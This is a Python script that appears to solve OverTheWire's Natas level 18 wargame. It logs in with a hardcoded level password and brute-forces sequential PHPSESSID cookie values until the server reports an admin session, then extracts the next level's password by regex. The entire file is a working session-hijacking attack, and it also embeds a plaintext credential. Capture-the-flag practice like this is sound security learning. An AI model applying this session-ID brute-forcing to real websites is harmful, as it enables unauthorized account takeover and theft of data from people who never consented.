import requests
from requests.auth import HTTPBasicAuth
import re


s = requests.Session()
URL = "http://natas18.natas.labs.overthewire.org"
s.auth = HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

for id in range(640):
    cookie = {'PHPSESSID':str(id)}
    response = s.post(url=URL,cookies=cookie)
    if "You are an admin" in response.text:

        password_item = re.search("Password: ([A-Za-z0-9]{32})", response.text)
        print(password_item.group())

